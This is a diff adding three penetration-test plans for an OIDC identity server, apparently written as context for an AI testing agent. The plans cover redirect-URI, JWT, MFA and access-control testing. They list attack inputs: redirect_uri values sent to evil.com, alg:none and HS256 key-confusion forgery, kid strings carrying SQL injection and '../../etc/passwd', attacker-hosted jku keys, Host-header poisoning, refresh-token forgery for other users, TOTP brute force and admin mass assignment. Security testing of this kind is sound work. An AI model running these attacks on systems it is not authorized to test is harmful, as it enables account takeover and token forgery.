@@ -1,0 +1,1311 @@
+I have already done done some basic scanning on this OIDC service, for history of what has been covered discovered and fixed:
+```
+# Plan 1: OAuth2/OIDC Protocol, JWT Tokens, and Client Registration
+
+## Goal
+
+Probe the full OAuth2/OIDC surface — the authorization endpoint, the token endpoint in every advertised grant, every JWT the server issues, and the dynamic client registration endpoint — for protocol violations, cryptographic weaknesses, cross-client confusion, and state-machine flaws that let one flows artifacts be replayed or redirected into another.
+
+## Service Reference
+
+### Discovery
+
+From `/.well-known/openid-configuration`:
+
+- **Grant types:** `authorization_code`, `refresh_token`, `password`, `client_credentials`
+- **Response types:** `code`
+- **Scopes:** `openid`, `profile`, `email`, `address`, `phone`, `offline_access`, `groups`
+- **PKCE:** `S256` enforced via `pkce_enforce_s256: "true"`
+- **Token auth:** `client_secret_basic`, `client_secret_post`
+- **Prompt values:** `none`, `login`, `create`
+
+### Endpoints
+
+| Method | Path | Purpose |
+|--------|------|---------|
+| GET    | `/oauth2/authorize`                  | Start authorization flow |
+| POST   | `/oauth2/login`                      | Browser login form submission |
+| POST   | `/oauth2/token`                      | Token issuance for all grants |
+| GET    | `/oauth2/userinfo`                   | Subject claims (Bearer auth) |
+| POST   | `/oauth2/introspect`                 | Token metadata (RFC 7662) |
+| POST   | `/oauth2/revoke`                     | Token revocation (RFC 7009) |
+| POST   | `/oauth2/logout`                     | End session |
+| POST   | `/oauth2/register`                   | Dynamic client registration (RFC 7591) |
+| GET    | `/oauth2/.well-known/jwks.json`      | Public keys |
+
+### Known Clients
+
+| client_id            | type          | auth method           | grants                                  |
+|----------------------|---------------|-----------------------|-----------------------------------------|
+| `autentico-admin`    | confidential  | `client_secret_basic` | `authorization_code`, `refresh_token`   |
+| `autentico-account`  | confidential  | `client_secret_basic` | `authorization_code`, `refresh_token`   |
+| `pentest-pwgrant`    | confidential  | `client_secret_basic` | `password`, `refresh_token`             |
+
+### Token Shapes
+
+- **Access token** — RS256, `kid: "autentico-key-1"`, `aud: []` (empty array), 60m expiry, carries `scope`, `azp`, `sid`, `email`, `preferred_username`.
+- **ID token** — RS256, same `kid`, `aud: <client_id>` (populated correctly).
+- **Refresh token** — HS256 (no `kid`), 720h expiry, minimal claims (`sub`, `sid`, `azp`).
+
+The RS256/HS256 asymmetry is significant — refresh tokens go through a different validation path and a different key.
+
+---
+
+## Test Areas
+
+### 1.1 Redirect URI Validation
+
+Replay the authorize request with mutated `redirect_uri`:
+
+- Path traversal: `http://localhost:9999/admin/callback/../evil`
+- Substring match: `http://localhost:9999/admin/callbackevil`
+- Different origin: `http://evil.com/callback`
+- Scheme change: `https://localhost:9999/admin/callback`
+- Parameter append: `http://localhost:9999/admin/callback?x=1`
+- Fragment injection: `http://localhost:9999/admin/callback#x`
+- Duplicate `redirect_uri` parameters with different values.
+
+Any redirect to an unregistered URI is critical. Then repeat at the token exchange step with a redirect_uri that differs from the one used at authorize (RFC 6749 §4.1.3 requires exact match).
+
+### 1.2 PKCE Enforcement
+
+With `pkce_enforce_s256: "true"`:
+
+- Authorize with no `code_challenge` / `code_challenge_method` at all.
+- Authorize with `code_challenge_method=plain`.
+- Authorize with a valid challenge, then omit `code_verifier` at token exchange.
+- Authorize with a valid challenge, then send a mismatched verifier.
+- Downgrade mid-flow: start with S256, then strip PKCE fields in the login POST.
+
+### 1.3 Authorization Code Replay and Rebinding
+
+- Exchange a code once (success), replay it, expect `invalid_grant`.
+- If replay is detected, confirm that tokens issued by the **first** exchange are revoked (RFC 6749 §10.5).
+- **Cross-client exchange**: obtain a code issued for `autentico-account`, exchange it with `autentico-admin` credentials. Must fail.
+- **Mismatched redirect at exchange**: obtain a code with one redirect_uri, exchange with another.
+- **Simultaneous flow swap**: two parallel authorize flows; try each code with the other clients credentials.
+
+### 1.4 State Parameter Handling
+
+- Authorize with no `state` — does the server issue a code anyway?
+- Authorize with `state=""` — is it echoed?
+- Servers responsibility is to pass state through unchanged, not to enforce it, but over-aggressive handling (reflecting unescaped) is a finding.
+
+### 1.5 Login Form Hidden Field Tampering
+
+`POST /oauth2/login` carries OAuth2 parameters as hidden form fields populated from `GET /oauth2/authorize`. The POST may not re-validate them against the session.
+
+- **Scope escalation**: change `scope` on the POST to add `groups`, `admin`, `offline_access`. Exchange the resulting code and inspect the `scope` claim.
+- **Redirect URI swap**: change `redirect_uri` on the POST to an attacker URL.
+- **Client ID swap**: start for `autentico-account`, submit with `client_id=autentico-admin`.
+- **PKCE downgrade**: start with S256, submit with empty challenge fields.
+- **Nonce injection**: authorize without `nonce`, inject one in the login POST, check the ID tokens `nonce` claim.
+
+### 1.6 Grant Type Abuse
+
+**Password grant (`grant_type=password`):**
+
+- `POST /oauth2/token` with `grant_type=password&username=admin&password=F00bar!&client_id=...`. If it works with `autentico-admin` (`token_endpoint_auth_method: none`), browser flow is fully bypassable.
+- Rate-limit check: 20+ rapid attempts with wrong password. Does the lockout apply across grant types? (See also 2.x in the Authentication plan.)
+- Password grant for deactivated users — the confirmed `deactivated-grant` issue means this must be re-validated after any fix.
+
+**Client credentials:**
+
+- Public clients should be denied. Verify.
+- For confidential clients that allow it, inspect token claims — does it carry `sub`? Does it grant admin-API access (see also cross-audience below)?
+
+### 1.7 Scope Escalation
+
+- Authorize with scopes beyond registration: `openid profile email groups admin offline_access`.
+- Refresh with an expanded scope:  
+  `grant_type=refresh_token&refresh_token=<rt>&scope=openid profile email groups`.  
+  Must not widen (RFC 6749 §6).
+- Request `offline_access` against clients not registered for `refresh_token` — does a refresh token appear anyway?
+
+### 1.8 Cross-Client Token Portability and Audience
+
+Prior finding: access tokens have `"aud": []`, admin API does not validate `azp`.
+
+- Tokens issued for `autentico-account` — replay against `/admin/api/*`. Should be rejected.
+- Refresh a token obtained via client A while authenticating as client B.
+- Introspect a token via client B that was issued to client A — should fail or return limited data.
+- Revoke a token issued to client A via client B — should fail.
+
+### 1.9 `prompt` Parameter
+
+- `prompt=create` with `allow_self_signup: "false"` — should be rejected; if it registers a user, the setting is bypassable.
+- `prompt=none` with deactivated user but live session.
+- `prompt=none` with `require_mfa: "true"` but session that only performed password auth.
+- Unknown values (`consent`, `select_account`, `invalid`) — must be rejected or cleanly ignored.
+
+### 1.10 `response_type` Confusion
+
+Server advertises only `code`.
+
+- `response_type=token` — must error with `unsupported_response_type`.
+- `response_type=code token`, `code id_token`, `id_token` — hybrid flows.
+- `response_type` omitted entirely.
+
+Any fall-through to implicit-like behavior places tokens in URL fragments.
+
+### 1.11 JWT Algorithm Confusion
+
+- **`alg:none`**: take a valid access token, rewrite header to `{"alg":"none","typ":"JWT"}`, drop the signature, send as Bearer. Also try `"None"`, `"NONE"`, `"nOnE"`.
+- **RS256 → HS256**: fetch JWK, convert to PEM, re-encode a token with `alg:HS256`, sign with the PEM as the HMAC secret, send as Bearer.
+- **`kid` injection**: mutate `kid` to `""`, `"nonexistent"`, `"" OR 1=1--"`, `"../../etc/passwd"`. Observe errors for info leakage and unexpected acceptance.
+- **`jku` / `x5u` injection**: add `jku: "http://<oast>/jwks.json"` (and an attacker-controlled JWKS hosting your own key) or `x5u`. Sign with your key. If the server fetches it, token forgery is complete.
+
+### 1.12 Refresh Token HS256 Key Discovery
+
+Refresh tokens are HS256 with no `kid`. Common implementation patterns for the key:
+
+1. Global server secret (strongest).
+2. The issuing clients `client_secret` (weak — anyone with DCR knows it).
+3. Derived (e.g., HMAC of `client_secret` + global salt).
+
+**Procedure:**
+
+1. Create a client with a known secret via `POST /admin/api/clients`.
+2. Obtain a refresh token via password grant on that client.
+3. Locally HMAC-SHA256 the `header.payload` with the clients secret as the key.
+4. Compare with the actual signature. Match ⇒ key **is** the client_secret.
+5. If confirmed, forge a refresh token with a different `sub` (another user), sign with the same secret, present at `/oauth2/token`. If accepted, **critical**: arbitrary user impersonation by any admin-authenticated user (DCR returns the secret).
+6. Cross-client comparison: create a second client and check if tokens from client A verify under client Bs secret. That distinguishes per-client vs. global keys.
+
+### 1.13 Token Type Confusion
+
+- **ID token as Bearer**: the ID token is RS256 with the same `kid` as access tokens and has a non-empty `aud`. If middleware only checks signature + `exp`, the ID token is accepted — and is actually *more* privileged than the access token (non-empty audience). Test against `/admin/api/users`, `/oauth2/userinfo`, `/account/api/profile`.
+- **Refresh token as Bearer**: HS256; should be rejected for algorithm mismatch.
+- **`typ` claim validation**: once forgery is possible (see 1.12), issue a JWT with `typ: "Refresh"` but the shape of an access token, or vice versa. Tests whether the middleware distinguishes token types by `typ`.
+
+### 1.14 Refresh Token Rotation and Revocation
+
+- Use RT1 to refresh; capture RT2. Replay RT1 — must fail.
+- If RT1 reuse is detected, RT2 should also be invalidated (replay-detection per OAuth 2.0 Security BCP).
+- Revoke a refresh token via `/oauth2/revoke`. Confirm refresh fails. Check whether the associated access token continues to work (likely yes — stateless JWT — but document).
+- Revoke an access token. Confirm introspection reports `active: false`. Check direct admin API usage (expected to still work until `exp` in stateless systems).
+
+### 1.15 `/oauth2/revoke` and `/oauth2/introspect`
+
+- Revocation without any client auth — must 401.
+- Cross-client revocation — client B revokes client As token. Must fail.
+- Introspection without client auth — must fail (prior finding flagged unauthenticated introspection; verify current behavior).
+- Cross-client introspection — client B introspects client As token. Should return limited or no info.
+- Introspect a token for a deactivated user — must report `active: false`. Per the `user-delete` finding this likely reports `active: true`; verify and document.
+- Introspect a revoked token — must report `active: false`.
+
+### 1.16 Dynamic Client Registration Abuse
+
+- **Unauthenticated registration**: `POST /oauth2/register` with no auth — should be rejected unless an initial access token (RFC 7591 §1.2) is presented.
+- **Attacker-controlled redirect_uri**: register a client pointing to an external host, run a real authorize flow with a logged-in user, confirm the code is redirected externally.
+- **Privileged grant types**: register a client requesting `password`, `client_credentials`, or all grants — the server should restrict what DCR can request.
+- **Scope escalation via DCR**: register with `"scopes": "openid admin offline_access groups"`, then run an authorize flow with that client and inspect issued token scopes.
+- **Confidential client via DCR**: register with `token_endpoint_auth_method: "client_secret_basic"` — does the response include a `client_secret`? (Feeds into 1.12.)
+- **Metadata URL SSRF**: separate OAST canary per field — `logo_uri`, `client_uri`, `policy_uri`, `tos_uri`, `jwks_uri`, `sector_identifier_uri`, `post_logout_redirect_uris`. Poll to learn which fields the server fetches and when. (See the SSRF plan for escalation.)
+- **Self-management (RFC 7592)**: if the response includes `registration_access_token` + `registration_client_uri`, test read / update / delete on the client record, especially mutating redirect URIs and grants after registration.
+- **Visibility**: does the new client appear in `/admin/api/clients`? A DCR-invisible client is a persistence channel.
+- **Duplicate client_id**: `"client_id": "autentico-admin"` — can the built-in admin client be overwritten?
+- **Post-logout redirect URI**: `post_logout_redirect_uris: ["http://attacker/phish"]`, then trigger logout — phishing via logout.
+
+### 1.17 Token Endpoint Authentication Confusion
+
+- Send both Basic auth and `client_secret` in POST body with different secrets — which wins?
+- For a client configured with `client_secret_basic`, send the secret only in the body (wrong method).
+- Use client As `client_id` with client Bs secret in the Basic header.
+- Send a confidential-client token request with no client authentication at all.
+
+### 1.18 Host Header Issuer Poisoning
+
+- `GET /.well-known/openid-configuration` with `Host: attacker.example.com` and with `X-Forwarded-Host` / `X-Forwarded-Proto`. If `issuer`, `authorization_endpoint`, `token_endpoint`, etc. reflect the Host header, relying parties can be poisoned.
+- Run an authorize flow with a spoofed Host header; inspect the `iss` claim in access / ID tokens. `iss` controlled by Host ⇒ a relying party that derives JWKS from `iss` fetches keys from an attacker.
+- Inspect the login forms `action` and any absolute URLs in server responses.
+
+### 1.19 Race Conditions
+
+- **Code double-spend**: two simultaneous token exchanges of the same code. Must issue exactly one token set.
+- **Refresh rotation race**: two simultaneous refreshes with the same RT. Exactly one must succeed; the other must fail.
+
+---
+
+## Execution Notes
+
+- **Key discovery (1.12)** is the highest-impact early test: a positive result undermines almost every other control.
+- **Token type confusion (1.13)** and **audience portability (1.8)** should be tested on the same captured tokens; they rely on the same middleware path.
+- **Race tests (1.19)** require tightly parallel `replay_send` calls — run each race 5–10 times to account for timing.
+- Log every issued token (access / refresh / id, with `jti`, `sid`, `azp`, `aud`, `scope`) so cross-test replay remains attributable.
+- JWT manipulation is a combination of `jwt_decode`, `encode`/`decode` for base64url, and an HMAC computation for the HS256 / algorithm-confusion tests.
+- Keep a dedicated test client (`pentest-*`) with a known secret to avoid cross-contaminating the built-in clients.
+```
+
+```
+# Plan 2: Authentication, Sessions, and MFA
+
+## Goal
+
+Test every human-credential and session surface: onboarding, login, account lockout, session lifecycle, cookie handling, TOTP enrollment, MFA enforcement, trusted devices, passkeys, and connected identity providers. The pattern surfaced by prior findings is that enforcement is concentrated in the browser-facing login form and absent from the OAuth2 token endpoint and several account-API paths — these tests are designed to confirm or deny that the pattern holds in every direction.
+
+## Service Reference
+
+### Settings (relevant subset)
+
+```
+onboarded: "true"
+auth_mode: "password"
+require_mfa: "false"
+mfa_method: "totp"
+require_email_verification: "false"
+allow_self_signup: "false"
+allow_self_service_deletion: "false"
+allow_username_change: "false"
+allow_email_change: "false"
+account_lockout_max_attempts: "5"
+account_lockout_duration: "15m"
+sso_session_idle_timeout: "4h"
+trust_device_enabled: "false"
+validation_min_password_length: "6"
+```
+
+### Endpoints
+
+| Method | Path | Purpose |
+|--------|------|---------|
+| GET/POST | `/onboard`                              | Initial admin setup (CSRF-protected HTML form) |
+| POST     | `/oauth2/login`                         | Browser login form submission |
+| POST     | `/oauth2/token`                         | Token endpoint — `password` grant is a second auth path |
+| POST     | `/oauth2/logout`                        | End IDP session |
+| POST     | `/account/api/mfa/totp/setup`           | Generate TOTP secret |
+| POST     | `/account/api/mfa/totp/verify`          | Complete enrollment |
+| DELETE   | `/account/api/mfa/totp`                 | Disable TOTP (requires `{"current_password": ...}`) |
+| GET      | `/account/api/mfa`                      | MFA state |
+| GET/DEL  | `/account/api/sessions`                 | List / revoke own sessions |
+| GET/DEL  | `/account/api/passkeys`                 | WebAuthn enrollment |
+| GET/DEL  | `/account/api/trusted-devices`          | Trusted device list |
+| GET/POST | `/account/api/connected-providers`      | Federated identity linkage |
+| GET      | `/admin/api/sessions`                   | Admin session listing |
+| DELETE   | `/admin/api/sessions/:id`               | Admin session termination |
+| POST     | `/admin/api/users/:id/unlock`           | Admin unlock for locked accounts |
+
+### Login Form Fields
+
+```
+gorilla.csrf.Token=<csrf>
+state=<state>
+redirect_uri=<uri>
+client_id=<client>
+scope=<scope>
+nonce=
+code_challenge=<pkce>
+code_challenge_method=S256
+username=<input>
+password=<input>
+```
+
+---
+
+## Test Areas
+
+### 2.1 Onboarding Re-Access
+
+Despite `onboarded: "true"`, `GET /onboard/` renders a form and `POST /onboard` accepted input (it returned 200 with a validation error for a short password). The check on *rendering* doesnt imply a check on *submission*.
+
+- `POST /onboard` with a valid new username and a valid password — can a second admin be created?
+- `POST /onboard` reusing the existing admin username with a different password — can the admin password be overwritten?
+- `POST /onboard` without the CSRF token / with an empty token / with a token from a different browser.
+- `POST /onboard` with populated OAuth2 hidden fields (`client_id`, `redirect_uri`, `scope`, `code_challenge`) — does it attempt to issue an authorization code alongside creation?
+- `POST /onboard` with extra body fields: `role=admin`, `is_email_verified=true`, `totp_verified=true` — mass-assignment on first-user creation.
+
+**Impact of a positive result:** full unauthenticated takeover of the platform.
+
+### 2.2 Account Lockout Semantics
+
+`account_lockout_max_attempts: 5` / `account_lockout_duration: 15m`.
+
+- Submit 5 failed logins on `POST /oauth2/login` — confirm lockout on attempt 6 with a correct password. Compare the locked response to the invalid-credentials response (message, status, timing) for enumeration.
+- After lockout via the login form, try the correct password via `POST /oauth2/token` `grant_type=password` through the `pentest-pwgrant` client. If it succeeds, the lockout is login-form-only and the password grant is an unlimited brute-force channel.
+- Conversely: burn 5 wrong password grants — does the login form observe the lockout?
+- **Counter reset behavior**: 4 failed attempts, 1 success, then 4 more failures — does the counter reset? A reset-on-success enables slow brute force under threshold.
+- **Username-case / whitespace bypass**: `User`, `USER`, `uSeR`, `admin`, `admin\t`. Does the lockout counter partition by case/whitespace variant?
+- **Per-IP vs per-account**: if lockout is per-IP, rotating IPs bypasses it. If per-account, parallel IPs still lock.
+- Admin counter reset: `PUT /admin/api/users/:id` with `{"failed_login_attempts": 0}` — does the admin API bypass the lockout timer? Also `POST /admin/api/users/:id/unlock`.
+
+### 2.3 Username Enumeration via Timing and Messages
+
+- `POST /oauth2/login` with (existing user, wrong password) vs (nonexistent user, wrong password) — compare status, body, timing over 20+ requests per case.
+- Repeat on `POST /oauth2/token grant_type=password`. The two paths may differ in error handling and leak more via the token endpoint.
+- `POST /account/api/mfa/totp/verify` timing with correct code vs random 6-digit wrong code vs adjacent-window code — constant time expected.
+
+### 2.4 Session Cookie Properties and Fixation
+
+- Capture `autentico_idp_session` before login; complete login; confirm the cookie value rotates (fixation defense).
+- `Path=/oauth2` — verify the session cookie is not sent on admin API requests (Bearer tokens cover those).
+- Confirm `Secure` and `HttpOnly` actually apply.
+- Test that cross-origin POST cannot set the cookie (no cookie injection surface from related subdomains).
+- `SameSite=Lax` — confirm top-level POST CSRF is blocked.
+
+### 2.5 CSRF Protection
+
+Login and onboard use Gorilla CSRF.
+
+- Visit the login page from two sessions — does the CSRF token from session A validate when paired with session Bs cookie? (Tokens must be bound to the cookie, not globally valid.)
+- Submit the login form with no `gorilla.csrf.Token` / empty string / the value from another users cookie jar.
+- **Login CSRF**: auto-submitting form from an attacker page that logs the victim into the **attackers** account. With `SameSite=Lax` this should be blocked, but verify — if `_gorilla_csrf` lacks `Secure` in some response contexts, the protection has gaps.
+
+### 2.6 Session Lifecycle
+
+- `last_activity_at` was observed as `null` on 12+ active sessions. If activity is never tracked, `sso_session_idle_timeout: "4h"` cannot be enforced. Issue traffic on a session and re-inspect.
+- **Concurrent session limit**: create many sessions — do old ones evict? Is there a per-user cap?
+- `DELETE /admin/api/sessions/:id` — does it actually invalidate the cookie server-side? Replay the cookie at `GET /oauth2/authorize?prompt=none` to check.
+- `DELETE /account/api/sessions/:id` — can a user kill their own session? Can a user kill another users session (IDOR with predictable `xid`)?
+- After `POST /oauth2/logout`: (a) session removed from admin list, (b) session cookie cleared (`Max-Age=0`), (c) refresh token revoked, (d) access token behavior (stateless JWT — likely still valid until `exp`; document).
+- **Cookie replay post-logout**: re-set the captured cookie, hit `GET /oauth2/authorize?prompt=none`. If a code is issued, logout is client-side-only.
+
+### 2.7 TOTP State Machine
+
+Enrollment is `setup` (generate secret) → `verify` (prove possession) → enabled. Disable requires current password.
+
+- **Repeated setup**: call `POST /account/api/mfa/totp/setup` twice. Compare secrets. If the second overwrites the first with no re-auth, an attacker with a stolen Bearer token can rotate the victims TOTP secret and lock them out of their authenticator.
+- **Verify without setup**: `POST /account/api/mfa/totp/verify` for a user that never called setup — error cleanly or crash / default-secret bypass?
+- **Double setup, verify with old secret**: call setup twice, then verify with a code derived from secret_1. Must fail.
+- **Disable without current password**: `DELETE /account/api/mfa/totp` with no body, empty `current_password`, wrong password, or via `PUT /account/api/mfa {"totp_enabled": false}`.
+- **Admin override**: `PUT /admin/api/users/:id` with MFA-related fields. Does it bypass user-facing step-up?
+- **Brute-force rate limit**: after enrollment, rapid-fire `/account/api/mfa/totp/verify` with `000000`, `000001`, …. 6-digit codes → 10⁶ space; a +/−1 window gives 3 concurrently valid codes. Without a rate limit, brute force is feasible.
+- **Window width**: generate codes at t−2, t−1, t, t+1, t+2 (30s steps). Typically t−1, t, t+1 accepted; a wider window reduces the brute-force horizon.
+- **Cross-account setup**: send `{"user_id": "<other>"}` in the setup body; confirm enrollment binds only to the tokens `sub`.
+- **Concurrent setup race**: two simultaneous setup calls; which secret is stored; does either successfully verify.
+
+### 2.8 MFA Policy Toggle and `acr` Enforcement
+
+- Log in without MFA, obtain tokens, then set `require_mfa: "true"`. Do existing tokens continue working? Can the user refresh? Is a new login blocked until TOTP is enrolled? Existing tokens carry `acr: "1"` (password only) — relying parties should reject them when stepping up to `acr: "2"`.
+- With `require_mfa: "true"`, does `grant_type=password` require a TOTP code? Is there a `totp` / `otp_code` parameter? If not, the password grant bypasses MFA entirely.
+- **Client-requested `acr_values`**: does `GET /oauth2/authorize?acr_values=2` force step-up, or is it ignored?
+
+Remember to restore `require_mfa: "false"` after testing.
+
+### 2.9 Passkey / WebAuthn Surface
+
+`/account/api/passkeys` returns `[]`. Probe registration flow.
+
+- `POST /account/api/passkeys/register/begin` / `/begin-registration`
+- `POST /account/api/passkeys/register/finish`
+- `POST /account/api/passkeys/login/begin` / `/login/finish`
+- `DELETE /account/api/passkeys/:id`
+
+### 2.10 Connected Providers (Federation Linking)
+
+- `POST /account/api/connected-providers` — can a user link an external IdP?
+- If federation is configured, can a user link to an **attacker-controlled** IdP and subsequently log in through it as the victim?
+- Does linking require email verification or MFA step-up?
+- `DELETE /account/api/connected-providers/:id` — does unlinking require re-auth? If the linked provider is the users only credential, does unlinking lock them out?
+
+### 2.11 Trusted Devices
+
+`trust_device_enabled: "false"` is configured, but the API may honor the operation anyway.
+
+- `GET /account/api/trusted-devices` — baseline.
+- `POST /account/api/trusted-devices` — can a user trust a device programmatically despite the disabled setting? If yes, combined with MFA policies, the attacker can trust their own device for permanent MFA bypass.
+- `DELETE /account/api/trusted-devices/:id` — does revocation require re-auth?
+
+### 2.12 Password Change Cascade
+
+Password change must revoke outstanding credentials. Prior patterns suggest it may not.
+
+- Create `pwtest`, issue tokens, verify `GET /account/api/profile`.
+- Admin: `PUT /admin/api/users/:id` with `{"password":"..."}`. Then test: old access token on profile / admin API; old refresh token at `/oauth2/token`; old password at password grant; new password at password grant; existing session in `/admin/api/sessions`.
+- Self-service password change (probe `PUT /account/api/password`, `POST /account/api/change-password`, `PUT /account/api/profile` with `password`). Does it require current password? After change, repeat the survival matrix.
+- **Concurrent race**: admin updates password while user refreshes — does the refresh succeed on the old RT?
+- **MFA enrollment survives password change**: start TOTP setup, change password, verify pending TOTP code — should the pending state persist?
+
+### 2.13 Self-Service Deletion With `allow_self_service_deletion: "false"`
+
+- `POST /account/api/deletion-request` with `{"reason":"..."}` — 403 (enforced) or 200 (bypass)?
+- If accepted, `GET /admin/api/deletion-requests` should list it.
+- `DELETE /account/api/deletion-request` to cancel; check state transitions.
+- Can a user submit a deletion request for the **sole admin**, locking out platform management?
+
+### 2.14 Password Policy
+
+Create users via the admin API with:
+
+- Exactly 6 chars: `123456`, `aaaaaa`.
+- Common passwords: `password`, `qwerty`.
+- Username equal to password.
+- Long (10,000 chars) to check `validation_max_password_length` and server limits.
+
+Confirm whether complexity beyond length is enforced.
+
+---
+
+## Execution Notes
+
+- Use a dedicated test user (`authtest` / `locktest` / `pwtest`) per test class so one doesnt perturb another. `locktest` specifically **will** become unusable — plan for it.
+- For race tests (2.7 concurrent setup, 2.12 refresh vs password change) use near-simultaneous `replay_send` bursts and repeat each race 5–10×.
+- TOTP testing requires generating valid codes programmatically: HMAC-SHA1(secret, ⌊unixtime/30⌋), 6 digits, dynamic truncation (RFC 6238).
+- **Always restore settings** (`require_mfa`, `allow_self_signup`, `allow_self_service_deletion`, `trust_device_enabled`) to their original values after toggle tests.
+- For browser-driven tests (onboard, login, logout, passkey registration), collaborate with the user to produce the flow and capture it; API-level replay follows.
+```
+
+```
+# Plan 3: Authorization, Access Control, and Account Lifecycle
+
+## Goal
+
+Test every authorization boundary — admin vs. user, cross-user (IDOR), privilege escalation via self-update, cross-tenant data exposure, and the completeness with which user lifecycle operations (create, deactivate, delete, reactivate) propagate through the system. The guiding hypothesis from prior testing is that the server validates operations in isolation but does not consistently enforce cross-resource invariants, so deleting a user leaves group memberships, refresh tokens, and sessions alive.
+
+## Service Reference
+
+### Roles
+
+Observed: `admin`, `user`. IDs follow the xid format (`d7appce6q30rn0lqdkkg`) — timestamp + machine + counter, so sequentially predictable.
+
+### Endpoints
+
+**Admin API** (`/admin/api/*`, Bearer auth, admin role):
+
+| Method | Path | Purpose |
+|--------|------|---------|
+| GET/POST | `/admin/api/users`                       | List / create users |
+| PUT/DEL  | `/admin/api/users/:id`                   | Update / deactivate |
+| POST     | `/admin/api/users/:id/unlock`            | Unlock locked account |
+| GET/POST | `/admin/api/groups`                      | List / create groups |
+| PUT/DEL  | `/admin/api/groups/:id`                  | Update / delete group |
+| GET/POST | `/admin/api/groups/:id/members`          | List / add members |
+| DEL      | `/admin/api/groups/:id/members/:user_id` | Remove member |
+| GET      | `/admin/api/clients`                     | List OAuth clients |
+| POST     | `/admin/api/clients`                     | Create client |
+| PUT/DEL  | `/admin/api/clients/:id`                 | Update / delete client |
+| GET/PUT  | `/admin/api/settings`                    | Read / update platform settings |
+| GET      | `/admin/api/sessions`                    | List active sessions |
+| DEL      | `/admin/api/sessions/:id`                | Terminate session |
+| GET/POST | `/admin/api/federation`                  | Federation providers |
+| PUT/DEL  | `/admin/api/federation/:id`              | Update / delete provider |
+| GET      | `/admin/api/deletion-requests`           | GDPR / self-service deletion queue |
+| GET      | `/admin/api/audit-logs?limit&offset`     | Audit log (paginated) |
+| GET      | `/admin/api/stats`                       | Dashboard |
+
+**Account API** (`/account/api/*`, Bearer auth, user-scoped):
+
+| Method | Path | Purpose |
+|--------|------|---------|
+| GET/PUT  | `/account/api/profile`                 | User-visible profile |
+| GET      | `/account/api/settings`                | User-visible platform settings |
+| GET/DEL  | `/account/api/sessions(/:id)`          | Own session management |
+| GET      | `/account/api/mfa`                     | MFA state |
+| POST     | `/account/api/mfa/totp/setup`          | TOTP enrollment |
+| POST     | `/account/api/mfa/totp/verify`         | Verify enrollment |
+| DEL      | `/account/api/mfa/totp`                | Disable TOTP |
+| GET      | `/account/api/passkeys`                | WebAuthn list |
+| GET      | `/account/api/connected-providers`     | Linked IdPs |
+| GET      | `/account/api/trusted-devices`         | Trusted device list |
+| GET/POST/DEL | `/account/api/deletion-request`    | Self-service deletion lifecycle |
+
+---
+
+## Test Areas
+
+### 3.1 Unauthenticated Probes
+
+Replay each admin API path with `Authorization` removed entirely. Every endpoint should return 401. Note anything that returns 200 (public, possibly by mistake) or 403 (auth required but different error path).
+
+Repeat with a syntactically malformed Bearer (`Authorization: Bearer notajwt`), an expired JWT, and a revoked JWT.
+
+### 3.2 User-Role Token Against Admin API
+
+Obtain a user-role token (password grant through `pentest-pwgrant`, or browser login as `user`). Replay the full admin matrix:
+
+| Endpoint                                | Expected |
+|-----------------------------------------|----------|
+| `GET/POST /admin/api/users`             | 401/403  |
+| `PUT/DEL /admin/api/users/:id`          | 401/403  |
+| `GET/POST /admin/api/groups`            | 401/403  |
+| `*/admin/api/groups/:id/members`        | 401/403  |
+| `GET/POST /admin/api/clients`           | 401/403  |
+| `PUT/DEL /admin/api/clients/:id`        | 401/403  |
+| `GET/PUT /admin/api/settings`           | 401/403  |
+| `GET /admin/api/sessions`               | 401/403  |
+| `DEL /admin/api/sessions/:id`           | 401/403  |
+| `GET/POST /admin/api/federation`        | 401/403  |
+| `GET /admin/api/audit-logs`             | 401/403  |
+| `GET /admin/api/stats`                  | 401/403  |
+| `GET /admin/api/deletion-requests`      | 401/403  |
+
+Any 200 is broken access control. Any endpoint that returns 403 instead of the expected 401 suggests a different code path thats worth exploring (often the endpoint leaks existence).
+
+### 3.3 Cross-Client Token Reuse on Admin API
+
+Prior finding: access tokens carry `"aud": []`, admin API does not validate `azp`.
+
+- Token obtained through `autentico-account` — use on `/admin/api/*`. Must be rejected.
+- Token from `pentest-pwgrant` — use on `/admin/api/*`.
+- DCR-registered clients token — use on `/admin/api/*`.
+
+If admin API accepts any clients token, combine with DCR (Plan 1) for unauthenticated-to-admin-token escalation.
+
+### 3.4 Privilege Escalation via Self-Update
+
+As the `user` account:
+
+```json
+PUT /admin/api/users/{own_id}
+{"role": "admin"}
+```
+
+Also test:
+
+```json
+{"is_email_verified": true, "totp_verified": true, "failed_login_attempts": 0}
+```
+
+Repeat via the account API in case the per-user surface is broader:
+
+- `PUT /account/api/profile` with `{"role": "admin"}`, `{"is_email_verified": true}`, `{"totp_verified": true}`, `{"failed_login_attempts": 0}`, `{"deactivated_at": null}` (reactivation), `{"id": "<other_id>"}`, `{"created_at": "2020-01-01T00:00:00Z"}`.
+- `PUT /account/api/profile` with `allow_email_change: "false"` set but body `{"email": "new@..."}`. Same for `username`. 200 with the field changed = setting is cosmetic.
+- Hidden profile fields (`website`, `gender`, `birthdate`, `locale`, `middle_name`, `nickname`, `profile`) that settings mark `hidden`. Server should reject.
+
+### 3.5 Mass Assignment on User Creation
+
+```json
+POST /admin/api/users
+{
+  "username": "masstest",
+  "password": "Masstest123!",
+  "email": "mass@test.com",
+  "role": "admin",
+  "is_email_verified": true,
+  "totp_verified": true,
+  "failed_login_attempts": 0,
+  "id": "custom-id-12345",
+  "deactivated_at": null
+}
+```
+
+Read back via `GET` to see which extra fields stuck. Role case variants (`ADMIN`, `Admin`, `administrator`, `superadmin`, empty) probe canonicalization.
+
+### 3.6 Account API IDOR and Cross-User
+
+The account API is implicitly scoped to the tokens `sub`.
+
+- `GET /account/api/profile` — can any parameter (`?user_id=`, path insertion) swap the subject?
+- `GET /account/api/sessions` — only the owners sessions should appear.
+- `DELETE /account/api/sessions/:id` — can a user guess another users session id (xid is predictable) and revoke it?
+- `POST /account/api/mfa/totp/setup` — can a body param (`user_id`, `sub`, `subject`) redirect enrollment to another user?
+- `POST /account/api/deletion-request` with a manipulated payload — can a user submit a deletion request for someone else, including the sole admin?
+
+### 3.7 Group Membership Authorization
+
+- As a user-role token, `POST /admin/api/groups/:id/members` to add self — should be denied by 3.2.
+- If group scope writes are possible via the account API, test self-addition there.
+- Add a user to a group, issue a token with `scope=openid groups`, remove the user from the group — does the token still carry the old group claim? Does `/oauth2/userinfo` return fresh memberships?
+- Add a **deactivated** user to a group — does the server reject, or does a "soft-deleted" user regain membership?
+- Add the **same** `user_id` twice — duplicate entries in the list response.
